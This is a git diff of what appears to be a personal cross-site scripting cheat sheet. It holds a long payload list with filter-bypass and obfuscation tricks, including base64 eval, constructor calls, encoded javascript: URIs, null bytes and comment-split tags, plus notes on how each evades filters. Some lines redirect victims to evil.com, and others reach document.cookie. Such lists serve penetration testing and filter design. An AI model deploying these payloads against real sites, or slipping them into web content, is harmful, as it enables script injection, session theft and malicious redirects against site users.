@@ -1,33 +1,54 @@
 
-```
-- Common Payloads
-
-
-
-- XSS Chained for CSRF
-
-```
-
-
-#### HTML context
-
-Note
-
-- tags - `script, img, svg, svg animate `
-- event handlers -  `onerror, onmouseover, onfocus, onblur, autofocus onfocus, onbegin `
-- functions -   `prompt, confirm, window.location("https://evil.com"), print`
-- if tag is hidden make use of AccessKey payload
-- \u0061 = 'a'
-- \u006c = 'l'
-- /al/.source → 'al' and /ert/.source → 'ert' So /al/.source + /ert/.source → 'alert'
-- top is the top-level window object (same as window in most contexts), top["alert"] is the same as alert
+### My Payloads list
 
 ```
 <script>alert(1)</script>
 
+<ScRipT>alert(1)</ScRipT>
+
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+<script>eval(atob("YWxlcnQoMSk="))</script>
+
+<script>Function.prototype.bind.call(alert, null, 1)();</script>
+
+<script>JSON.parse('{"__proto__":{"toString":"alert(1)"}}')</script>
+
+<script>((_)=>{[_][_]('alert(1)')('constructor')})('constructor')</script>
+
+<script>[]['filter']['constructor']('ale' + 'rt(1)')()</script>
+
+<script>((()=>{})['constructor']('alert(1)'))()</script>
+
+<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
+
+<scr<script>ipt>alert(1)</script>
+
+<script%00>alert(1)</script>
+
+<script>({a:alert(1)}.a)</script>
+
 <script>alert`1`</script>
 
+<script>alert`${1}`</script>
+
+<script>self[`aler` + `t`]`\u006c`</script>
+
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+<script>
+var el = document.createElement('img');
+el.setAttribute('src', 'x');
+el.setAttribute('onerror', 'alert(1)');
+document.body.appendChild(el);
+</script>
+
+
 <img src=1 onerror=alert(1)>
+
+<IMG SRC="jav&#x09;ascript:alert(1)">
+<IMG SRC="jav&#x0A;ascript:alert(1)">
+<IMG SRC="jav&#x0D;ascript:alert(1)">
 
 <a href="javascript:alert(1)">
 
@@ -46,33 +67,37 @@ Note
 
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
 
+<svg/onload=eval("ale"+"rt")(`✓${alert`✓`}`)>
+
 <input type="hidden" accesskey="X" onclick="alert(1)">
+
+<input onblur=top[/al/.source+/ert/.source]("_Y00!_") autofocus><input autofocus>
+<input onblur=["_Y00!_"].find(alert) autofocus><input autofocus>
+<input onblur=(((confirm)))("_Y00!_") autofocus><input autofocus>
 
 <h1 onclick=\u0061\u006cert("_Y000!_")>Y00</h1>
 
-<input onblur=top[/al/.source+/ert/.source]("_Y00!_") autofocus><input autofocus>
+<h1 onmouseover= (((confirm)))`_Y000!_`>
+
+<p/onclick=%27new%20Function`al\ert\`\u0059\u0030\u0030\u0030\``%27>d
+
+<p/onclick=self[`aler`%2b`t`]`\u0059\u0030\u0030\u0030`>d
+
+<form><button formaction=javascript&colon;alert('xss_by_Y000!')>
+
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+
+<style>*{background:url("javascript:alert(1)")}</style>
+
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
 
 ```
-#### Javsscript Context
-
-Note
-
-- if ' is ecaped then add \ in the begining of payload,  it will escape the / and payload will be successful.
-- if ' is blocked then use html encoded &apos;
-- if . is blocked then use []
-- if ; are blocked then use {}
-- if () are blocked then use `throw` in javascript (https://esdiscuss.org/topic/hacking-onerror-throw)
-- if the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...}
-
-- `document['cookie']` is the same as `document.cookie` - In JavaScript, object['property'] and object.property are equivalent for accessing properties
-- `with(document)alert(cookie)` is same as `alert(document.cookie)` - The with(document) statement temporarily changes the scope to the document object. So inside the with block (or expression), unqualified property names are assumed to be properties of document.
-- Execute alert(1) by dynamically creating a function with new Function(...)
-- 'new Function\al\ert\`1\`' `is osfucated version of` Function("alert(1)")()
-- self[`aler`%2b`t`]`1` - self is a reference to the global object in browsers (same as window), so self["alert"] is just alert, Here, %2b is URL encoding for the plus sign (+), so its like `aler`%2b`t` → `aler` + `t` → "aler" + "t" → "alert". So the payload becomes: self["alert"]`1`, This is equivalent to: alert`1`
-
 
 ```
 ";window.location="https://evil.com";//996
+window.location.assign("http://google.com")
+window['location']['href']="http://google.com"
 
 '-alert(1)-'
 ';alert(1)//
@@ -101,7 +126,72 @@ Function("alert(1)")()
 alert`1`
 self[`aler`%2b`t`]`1`
 
+jav&#x09;ascript:alert(1)
+jav&#x0A;ascript:alert(1)
+jav&#x0D;ascript:alert(1)
+
+java\u0073cript:al\u0065rt(1)
+
+eval(atob("YWxlcnQoMSk="))
+((_)=>{[_][_]('alert(1)')('constructor')})('constructor') 
+[]['filter']['constructor']('alert(1)')()
+
+constructor.constructor('al'+'ert(1)')()
+
 ```
+
+### Obsucations and Tricks
+
+Notes
+
+- tags - `script, img, svg, svg animate `
+- event handlers -  `onerror, onmouseover, onfocus, onblur, autofocus onfocus, onbegin `
+- functions -   `prompt, confirm, window.location("https://evil.com"), print`
+- if tag is hidden make use of AccessKey payload
+- Unicode escapes:
+    - \u0061 = 'a'
+    - \u006c = 'l'
+- /al/.source → 'al' and /ert/.source → 'ert' So /al/.source + /ert/.source → 'alert'
+- top is the top-level window object (same as window in most contexts), top["alert"] is the same as alert
+- ["_Y00!_"].find(alert) - You are creating an array with a string: ["_Y00!_"], .find(alert) will call alert("_Y00!_")
+- (((confirm))) simply resolved to confirm
+- new Function`al\ert\`\u0059\u0030\u0030\u0030\`` -> new Function('alert(`Y000`)')()
+- self[\aler`%2b`t`]` - This uses dynamic property access on the self object (which refers to window in browsers), `aler` + `t` → alert (this avoids direct use of the word alert to bypass filters).
+
+- if ' is ecaped then add \ in the begining of payload,  it will escape the / and payload will be successful.
+- if ' is blocked then use html encoded &apos;
+- if . is blocked then use []
+- if ; are blocked then use {}
+- if () are blocked then use `throw` in javascript (https://esdiscuss.org/topic/hacking-onerror-throw)
+- if the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...}
+- Below payload completely avoids inline script content
+    <script>
+    var el = document.createElement('img');
+    el.setAttribute('src', 'x');
+    el.setAttribute('onerror', 'alert(1)');
+    document.body.appendChild(el);
+    </script>
+
+- `document['cookie']` is the same as `document.cookie` - In JavaScript, object['property'] and object.property are equivalent for accessing properties
+- `with(document)alert(cookie)` is same as `alert(document.cookie)` - The with(document) statement temporarily changes the scope to the document object. So inside the with block (or expression), unqualified property names are assumed to be properties of document.
+- Execute alert(1) by dynamically creating a function with new Function(...)
+- 'new Function\al\ert\`1\`' `is osfucated version of` Function("alert(1)")()
+- self[`aler`%2b`t`]`1` - self is a reference to the global object in browsers (same as window), so self["alert"] is just alert, Here, %2b is URL encoding for the plus sign (+), so its like `aler`%2b`t` → `aler` + `t` → "aler" + "t" → "alert". So the payload becomes: self["alert"]`1`, This is equivalent to: alert`1`
+- "jav&#x09;ascript:alert(1)" - &#x09; is a tab character in HTML character reference, So "jav&#x09;ascript:alert(1)" becomes "jav<TAB>ascript:alert(1)". This is a known technique to bypass naive filters that look for the exact string javascript:
+- "jav&#x0A;ascript:alert(1)" - &#x0A; is a line feed (newline) character. So the SRC attribute value becomes: "jav\nascript:alert(1)" (with a newline in the middle). Similar to the tab example (&#x09;), the newline is used to bypass simple filters that look for the string "javascript:" literally.
+- "jav&#x0D;ascript:alert(1)" - &#x0D; is a carriage return (CR) character. So this makes the SRC attribute value "jav\r ascript:alert(1)" (with a carriage return in the middle). This can bypass simple filters that are scanning for the exact string "javascript:".
+- PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== - <script>alert(1)</script>
+- The srcdoc attribute lets you directly embed HTML content inside an iframe.
+- <script%00>alert(1)</script> - %00 is a URL-encoded null byte (\0 character)., Null bytes are sometimes used in attacks to bypass poorly implemented input filters.
+- {a: alert(1)} creates an object literal with a property a whose value is the result of calling alert(1). So alert(1) is executed immediately when the object is created.
+- <scr<!-- -->ipt>alert(1)</scr<!-- -->ipt> - Browsers ignore comments inside HTML, including inside tag names. So the browser effectively treats it as: <script>alert(1)</script>
+- atob("YWxlcnQoMSk=") when base64 decoded is alert(1)
+- ((_)=>{[_][_]('alert(1)')('constructor')})('constructor') - 	Triggers alert(1) via obfuscation
+- []['filter']['constructor']('alert(1)')() - triggers alert(1)
+- ((()=>{})['constructor']('alert(1)'))() - triggers alert(1)
+- Function.prototype.bind.call(alert, null, 1) This returns a new function equivalent to: () => alert(1), then executes alert(1)
+
+
 
 #### XSS - Dangling Markup HTML Scriptless Injection
 
